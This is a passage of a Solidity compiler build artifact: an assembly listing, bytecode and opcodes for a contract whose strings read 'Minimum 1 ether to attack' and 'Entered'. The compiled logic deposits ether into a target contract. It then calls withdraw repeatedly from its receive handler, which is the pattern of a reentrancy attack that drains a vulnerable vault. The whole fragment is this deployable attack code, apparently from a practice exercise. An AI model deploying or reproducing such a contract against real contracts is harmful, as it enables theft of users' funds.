\"#utility.yul\":3129:3138   */\n      0x00\n        /* \"#utility.yul\":3162:3215   */\n      tag_112\n        /* \"#utility.yul\":3180:3214   */\n      tag_113\n        /* \"#utility.yul\":3189:3213   */\n      tag_114\n        /* \"#utility.yul\":3207:3212   */\n      dup5\n        /* \"#utility.yul\":3189:3213   */\n      tag_62\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":3180:3214   */\n      tag_55\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":3162:3215   */\n      tag_62\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":3149:3215   */\n      swap1\n      pop\n        /* \"#utility.yul\":3079:3221   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3227:3353   */\n    tag_64:\n        /* \"#utility.yul\":3277:3286   */\n      0x00\n        /* \"#utility.yul\":3310:3347   */\n      tag_116\n        /* \"#utility.yul\":3341:3346   */\n      dup3\n        /* \"#utility.yul\":3310:3347   */\n      tag_63\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":3297:3347   */\n      swap1\n      pop\n        /* \"#utility.yul\":3227:3353   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3359:3511   */\n    tag_65:\n        /* \"#utility.yul\":3435:3444   */\n      0x00\n        /* \"#utility.yul\":3468:3505   */\n      tag_118\n        /* \"#utility.yul\":3499:3504   */\n      dup3\n        /* \"#utility.yul\":3468:3505   */\n      tag_64\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":3455:3505   */\n      swap1\n      pop\n        /* \"#utility.yul\":3359:3511   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3517:3700   */\n    tag_66:\n        /* \"#utility.yul\":3630:3693   */\n      tag_120\n        /* \"#utility.yul\":3687:3692   */\n      dup2\n        /* \"#utility.yul\":3630:3693   */\n      tag_65\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":3625:3628   */\n      dup3\n        /* \"#utility.yul\":3618:3694   */\n      mstore\n        /* \"#utility.yul\":3517:3700   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3706:3980   */\n    tag_26:\n        /* \"#utility.yul\":3825:3829   */\n      0x00\n        /* \"#utility.yul\":3863:3865   */\n      0x20\n        /* \"#utility.yul\":3852:3861   */\n      dup3\n        /* \"#utility.yul\":3848:3866   */\n      add\n        /* \"#utility.yul\":3840:3866   */\n      swap1\n      pop\n        /* \"#utility.yul\":3876:3973   */\n      tag_122\n        /* \"#utility.yul\":3970:3971   */\n      0x00\n        /* \"#utility.yul\":3959:3968   */\n      dup4\n        /* \"#utility.yul\":3955:3972   */\n      add\n        /* \"#utility.yul\":3946:3952   */\n      dup5\n        /* \"#utility.yul\":3876:3973   */\n      tag_66\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":3706:3980   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3986:4082   */\n    tag_67:\n        /* \"#utility.yul\":4023:4030   */\n      0x00\n        /* \"#utility.yul\":4052:4076   */\n      tag_124\n        /* \"#utility.yul\":4070:4075   */\n      dup3\n        /* \"#utility.yul\":4052:4076   */\n      tag_62\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":4041:4076   */\n      swap1\n      pop\n        /* \"#utility.yul\":3986:4082   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4088:4206   */\n    tag_68:\n        /* \"#utility.yul\":4175:4199   */\n      tag_126\n        /* \"#utility.yul\":4193:4198   */\n      dup2\n        /* \"#utility.yul\":4175:4199   */\n      tag_67\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":4170:4173   */\n      dup3\n        /* \"#utility.yul\":4163:4200   */\n      mstore\n        /* \"#utility.yul\":4088:4206   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4212:4434   */\n    tag_31:\n        /* \"#utility.yul\":4305:4309   */\n      0x00\n        /* \"#utility.yul\":4343:4345   */\n      0x20\n        /* \"#utility.yul\":4332:4341   */\n      dup3\n        /* \"#utility.yul\":4328:4346   */\n      add\n        /* \"#utility.yul\":4320:4346   */\n      swap1\n      pop\n        /* \"#utility.yul\":4356:4427   */\n      tag_128\n        /* \"#utility.yul\":4424:4425   */\n      0x00\n        /* \"#utility.yul\":4413:4422   */\n      dup4\n        /* \"#utility.yul\":4409:4426   */\n      add\n        /* \"#utility.yul\":4400:4406   */\n      dup5\n        /* \"#utility.yul\":4356:4427   */\n      tag_68\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":4212:4434   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4521:4638   */\n    tag_70:\n        /* \"#utility.yul\":4630:4631   */\n      0x00\n        /* \"#utility.yul\":4627:4628   */\n      0x00\n        /* \"#utility.yul\":4620:4632   */\n      revert\n        /* \"#utility.yul\":4767:4889   */\n    tag_72:\n        /* \"#utility.yul\":4840:4864   */\n      tag_133\n        /* \"#utility.yul\":4858:4863   */\n      dup2\n        /* \"#utility.yul\":4840:4864   */\n      tag_54\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":4833:4838   */\n      dup2\n        /* \"#utility.yul\":4830:4865   */\n      eq\n        /* \"#utility.yul\":4820:4883   */\n      tag_134\n      jumpi\n        /* \"#utility.yul\":4879:4880   */\n      0x00\n        /* \"#utility.yul\":4876:4877   */\n      0x00\n        /* \"#utility.yul\":4869:4881   */\n      revert\n        /* \"#utility.yul\":4820:4883   */\n    tag_134:\n        /* \"#utility.yul\":4767:4889   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4895:5038   */\n    tag_73:\n        /* \"#utility.yul\":4952:4957   */\n      0x00\n        /* \"#utility.yul\":4983:4989   */\n      dup2\n        /* \"#utility.yul\":4977:4990   */\n      mload\n        /* \"#utility.yul\":4968:4990   */\n      swap1\n      pop\n        /* \"#utility.yul\":4999:5032   */\n      tag_136\n        /* \"#utility.yul\":5026:5031   */\n      dup2\n        /* \"#utility.yul\":4999:5032   */\n      tag_72\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":4895:5038   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5044:5395   */\n    tag_35:\n        /* \"#utility.yul\":5114:5120   */\n      0x00\n        /* \"#utility.yul\":5163:5165   */\n      0x20\n        /* \"#utility.yul\":5151:5160   */\n      dup3\n        /* \"#utility.yul\":5142:5149   */\n      dup5\n        /* \"#utility.yul\":5138:5161   */\n      sub\n        /* \"#utility.yul\":5134:5166   */\n      slt\n        /* \"#utility.yul\":5131:5250   */\n      iszero\n      tag_138\n      jumpi\n        /* \"#utility.yul\":5169:5248   */\n      tag_139\n      tag_70\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":5131:5250   */\n    tag_138:\n        /* \"#utility.yul\":5289:5290   */\n      0x00\n        /* \"#utility.yul\":5314:5378   */\n      tag_140\n        /* \"#utility.yul\":5370:5377   */\n      dup5\n        /* \"#utility.yul\":5361:5367   */\n      dup3\n        /* \"#utility.yul\":5350:5359   */\n      dup6\n        /* \"#utility.yul\":5346:5368   */\n      add\n        /* \"#utility.yul\":5314:5378   */\n      tag_73\n      jump\t// in\n    tag_140:\n        /* \"#utility.yul\":5304:5378   */\n      swap2\n      pop\n        /* \"#utility.yul\":5260:5388   */\n      pop\n        /* \"#utility.yul\":5044:5395   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5401:5576   */\n    tag_74:\n        /* \"#utility.yul\":5541:5568   */\n      0x4d696e696d756d203120657468657220746f2061747461636b00000000000000\n        /* \"#utility.yul\":5537:5538   */\n      0x00\n        /* \"#utility.yul\":5529:5535   */\n      dup3\n        /* \"#utility.yul\":5525:5539   */\n      add\n        /* \"#utility.yul\":5518:5569   */\n      mstore\n        /* \"#utility.yul\":5401:5576   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5582:5948   */\n    tag_75:\n        /* \"#utility.yul\":5724:5727   */\n      0x00\n        /* \"#utility.yul\":5745:5812   */\n      tag_143\n        /* \"#utility.yul\":5809:5811   */\n      0x19\n        /* \"#utility.yul\":5804:5807   */\n      dup4\n        /* \"#utility.yul\":5745:5812   */\n      tag_50\n      jump\t// in\n    tag_143:\n        /* \"#utility.yul\":5738:5812   */\n      swap2\n      pop\n        /* \"#utility.yul\":5821:5914   */\n      tag_144\n        /* \"#utility.yul\":5910:5913   */\n      dup3\n        /* \"#utility.yul\":5821:5914   */\n      tag_74\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":5939:5941   */\n      0x20\n        /* \"#utility.yul\":5934:5937   */\n      dup3\n        /* \"#utility.yul\":5930:5942   */\n      add\n        /* \"#utility.yul\":5923:5942   */\n      swap1\n      pop\n        /* \"#utility.yul\":5582:5948   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5954:6373   */\n    tag_40:\n        /* \"#utility.yul\":6120:6124   */\n      0x00\n        /* \"#utility.yul\":6158:6160   */\n      0x20\n        /* \"#utility.yul\":6147:6156   */\n      dup3\n        /* \"#utility.yul\":6143:6161   */\n      add\n        /* \"#utility.yul\":6135:6161   */\n      swap1\n      pop\n        /* \"#utility.yul\":6207:6216   */\n      dup2\n        /* \"#utility.yul\":6201:6205   */\n      dup2\n        /* \"#utility.yul\":6197:6217   */\n      sub\n        /* \"#utility.yul\":6193:6194   */\n      0x00\n        /* \"#utility.yul\":6182:6191   */\n      dup4\n        /* \"#utility.yul\":6178:6195   */\n      add\n        /* \"#utility.yul\":6171:6218   */\n      mstore\n        /* \"#utility.yul\":6235:6366   */\n      tag_146\n        /* \"#utility.yul\":6361:6365   */\n      dup2\n        /* \"#utility.yul\":6235:6366   */\n      tag_75\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":6227:6366   */\n      swap1\n      pop\n        /* \"#utility.yul\":5954:6373   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6379:6482   */\n    tag_76:\n        /* \"#utility.yul\":6442:6449   */\n      0x00\n        /* \"#utility.yul\":6471:6476   */\n      dup2\n        /* \"#utility.yul\":6460:6476   */\n      swap1\n      pop\n        /* \"#utility.yul\":6379:6482   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6488:6682   */\n    tag_77:\n        /* \"#utility.yul\":6564:6573   */\n      0x00\n        /* \"#utility.yul\":6597:6676   */\n      tag_149\n        /* \"#utility.yul\":6615:6675   */\n      tag_150\n        /* \"#utility.yul\":6624:6674   */\n      tag_151\n        /* \"#utility.yul\":6668:6673   */\n      dup5\n        /* \"#utility.yul\":6624:6674   */\n      tag_76\n      jump\t// in\n    tag_151:\n        /* \"#utility.yul\":6615:6675   */\n      tag_55\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":6597:6676   */\n      tag_54\n      jump\t// in\n    tag_149:\n        /* \"#utility.yul\":6584:6676   */\n      swap1\n      pop\n        /* \"#utility.yul\":6488:6682   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6688:6871   */\n    tag_78:\n        /* \"#utility.yul\":6801:6864   */\n      tag_153\n        /* \"#utility.yul\":6858:6863   */\n      dup2\n        /* \"#utility.yul\":6801:6864   */\n      tag_77\n      jump\t// in\n    tag_153:\n        /* \"#utility.yul\":6796:6799   */\n      dup3\n        /* \"#utility.yul\":6789:6865   */\n      mstore\n        /* \"#utility.yul\":6688:6871   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6877:7151   */\n    tag_42:\n        /* \"#utility.yul\":6996:7000   */\n      0x00\n        /* \"#utility.yul\":7034:7036   */\n      0x20\n        /* \"#utility.yul\":7023:7032   */\n      dup3\n        /* \"#utility.yul\":7019:7037   */\n      add\n        /* \"#utility.yul\":7011:7037   */\n      swap1\n      pop\n        /* \"#utility.yul\":7047:7144   */\n      tag_155\n        /* \"#utility.yul\":7141:7142   */\n      0x00\n        /* \"#utility.yul\":7130:7139   */\n      dup4\n        /* \"#utility.yul\":7126:7143   */\n      add\n        /* \"#utility.yul\":7117:7123   */\n      dup5\n        /* \"#utility.yul\":7047:7144   */\n      tag_78\n      jump\t// in\n    tag_155:\n        /* \"#utility.yul\":6877:7151   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122027c1ca21e7245adffa46a1bc3bb576e60480c726f8e2f65e32eeeadd7576fde864736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b506040516108a03803806108a083398181016040528101906100319190610150565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061018e565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b6100f4816100da565b81146100fe575f5ffd5b50565b5f8151905061010f816100eb565b92915050565b5f61011f826100bb565b9050919050565b61012f81610115565b8114610139575f5ffd5b50565b5f8151905061014a81610126565b92915050565b5f5f60408385031215610166576101656100b7565b5b5f61017385828601610101565b92505060206101848582860161013c565b9150509250929050565b6107058061019b5f395ff3fe608060405260043610610037575f3560e01c806312065fe01461011e578063144166ae146101485780639e5faafc146101725761011a565b3661011a577f69a6cf7852823a03f1e0278fa944045502fae9fb546695dbf1f50521651a8b735f60405161006b9190610453565b60405180910390a1670853a0d2313c000061008461017c565b10610118575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670853a0d2313c00006040518263ffffffff1660e01b81526004016100ea91906104b8565b5f604051808303815f87803b158015610101575f5ffd5b505af1158015610113573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b348015610129575f5ffd5b5061013261017c565b60405161013f91906104e0565b60405180910390f35b348015610153575f5ffd5b5061015c61021a565b604051610169919061056a565b60405180910390f35b61017a61023e565b005b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f336040518263ffffffff1660e01b81526004016101d691906105a3565b602060405180830381865afa1580156101f1573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061021591906105ea565b905090565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670853a0d2313c000061024f61017c565b1015610290576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102879061065f565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b6b55f25671bc16d674ec800006040518263ffffffff1660e01b81526004016102f191906106b6565b5f604051808303815f87803b158015610308575f5ffd5b505af115801561031a573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d671bc16d674ec800006040518263ffffffff1660e01b815260040161037f91906106b6565b5f604051808303815f87803b158015610396575f5ffd5b505af11580156103a8573d5f5f3e3d5ffd5b50505050565b5f82825260208201905092915050565b7f456e7465726564000000000000000000000000000000000000000000000000005f82015250565b5f6103f26007836103ae565b91506103fd826103be565b602082019050919050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61043d61043861043384610408565b61041a565b610411565b9050919050565b61044d81610423565b82525050565b5f6040820190508181035f83015261046a816103e6565b90506104796020830184610444565b92915050565b5f819050919050565b5f6104a261049d6104988461047f565b61041a565b610411565b9050919050565b6104b281610488565b82525050565b5f6020820190506104cb5f8301846104a9565b92915050565b6104da81610411565b82525050565b5f6020820190506104f35f8301846104d1565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61053261052d610528846104f9565b61041a565b6104f9565b9050919050565b5f61054382610518565b9050919050565b5f61055482610539565b9050919050565b6105648161054a565b82525050565b5f60208201905061057d5f83018461055b565b92915050565b5f61058d826104f9565b9050919050565b61059d81610583565b82525050565b5f6020820190506105b65f830184610594565b92915050565b5f5ffd5b6105c981610411565b81146105d3575f5ffd5b50565b5f815190506105e4816105c0565b92915050565b5f602082840312156105ff576105fe6105bc565b5b5f61060c848285016105d6565b91505092915050565b7f4d696e696d756d203120657468657220746f2061747461636b000000000000005f82015250565b5f6106496019836103ae565b915061065482610615565b602082019050919050565b5f6020820190508181035f8301526106768161063d565b9050919050565b5f819050919050565b5f6106a061069b6106968461067d565b61041a565b610411565b9050919050565b6106b081610686565b82525050565b5f6020820190506106c95f8301846106a7565b9291505056fea264697066735822122027c1ca21e7245adffa46a1bc3bb576e60480c726f8e2f65e32eeeadd7576fde864736f6c634300081c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x8A0 CODESIZE SUB DUP1 PUSH2 0x8A0 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x150 JUMP JUMPDEST DUP2 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x18E JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE4 DUP3 PUSH2 0xBB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF4 DUP2 PUSH2 0xDA JUMP JUMPDEST DUP2 EQ PUSH2 0xFE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x10F DUP2 PUSH2 0xEB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x11F DUP3 PUSH2 0xBB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x12F DUP2 PUSH2 0x115 JUMP JUMPDEST DUP2 EQ PUSH2 0x139 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x14A DUP2 PUSH2 0x126 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x166 JUMPI PUSH2 0x165 PUSH2 0xB7 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x173 DUP6 DUP3 DUP7 ADD PUSH2 0x101 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x184 DUP6 DUP3 DUP7 ADD PUSH2 0x13C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x705 DUP1 PUSH2 0x19B PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x11E JUMPI DUP1 PUSH4 0x144166AE EQ PUSH2 0x148 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x172 JUMPI PUSH2 0x11A JUMP JUMPDEST CALLDATASIZE PUSH2 0x11A JUMPI PUSH32 0x69A6CF7852823A03F1E0278FA944045502FAE9FB546695DBF1F50521651A8B73 PUSH0 PUSH1 0x40 MLOAD PUSH2 0x6B SWAP2 SWAP1 PUSH2 0x453 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH8 0x853A0D2313C0000 PUSH2 0x84 PUSH2 0x17C JUMP JUMPDEST LT PUSH2 0x118 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0x853A0D2313C0000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEA SWAP2 SWAP1 PUSH2 0x4B8 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x101 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x113 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x129 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x132 PUSH2 0x17C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x13F SWAP2 SWAP1 PUSH2 0x4E0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x153 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x15C PUSH2 0x21A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x169 SWAP2 SWAP1 PUSH2 0x56A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17A PUSH2 0x23E JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF8B2CB4F CALLER PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1D6 SWAP2 SWAP1 PUSH2 0x5A3 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1F1 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x215 SWAP2 SWAP1 PUSH2 0x5EA JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0x853A0D2313C0000 PUSH2 0x24F PUSH2 0x17C JUMP JUMPDEST LT ISZERO PUSH2 0x290 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x287 SWAP1 PUSH2 0x65F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB6B55F25 PUSH8 0x1BC16D674EC80000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2F1 SWAP2 SWAP1 PUSH2 0x6B6 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x308 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x31A JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0x1BC16D674EC80000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x37F SWAP2 SWAP1 PUSH2 0x6B6 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x396 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3A8 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x456E746572656400000000000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x3F2 PUSH1 0x7 DUP4 PUSH2 0x3AE JUMP JUMPDEST SWAP2 POP PUSH2 0x3FD DUP3 PUSH2 0x3BE JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x43D PUSH2 0x438 PUSH2 0x433 DUP5 PUSH2 0x408 JUMP JUMPDEST PUSH2 0x41A JUMP JUMPDEST PUSH2 0x411 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x44D DUP2 PUSH2 0x423 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x46A DUP2 PUSH2 0x3E6 JUMP JUMPDEST SWAP1 POP PUSH2 0x479 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x444 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4A2 PUSH2 0x49D PUSH2 0x498 DUP5 PUSH2 0x47F JUMP JUMPDEST PUSH2 0x41A JUMP JUMPDEST PUSH2 0x411 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4B2 DUP2 PUSH2 0x488 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4CB PUSH0 DUP4 ADD DUP5 PUSH2 0x4A9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x4DA DUP2 PUSH2 0x411 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4F3 PUSH0 DUP4 ADD DUP5 PUSH2 0x4D1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 